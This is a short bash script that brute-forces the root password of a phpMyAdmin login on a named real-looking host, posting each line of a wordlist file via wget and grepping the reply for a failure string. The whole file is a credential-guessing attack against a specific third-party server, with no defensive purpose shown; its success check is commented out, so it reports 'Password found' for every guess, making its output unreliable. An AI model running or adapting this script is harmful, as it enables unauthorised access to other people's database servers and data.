#!/bin/bash

#PORT=10000
#HOST=ride4fun.com.pl
#n=0
cannot="Cannot"
while read line; do
	wget --save-cookies cookies.txt --post-data "pma_username=root&pma_password=$line"  -O /tmp/temp.html http://z7.ipartner.com.pl/phpmyadmin/ -b -q 2>1 >> /dev/null
	temp=$(grep "$cannot" "/tmp/temp.html")
	echo $temp


	#echo $temp
	#if [ "$temp" != "$cannot" ]; then
		echo -n "Password found: "
		echo $line
		echo stop
	#fi
	sleep 1
	#rm temp.html
done < /tmp/wejscie.txt

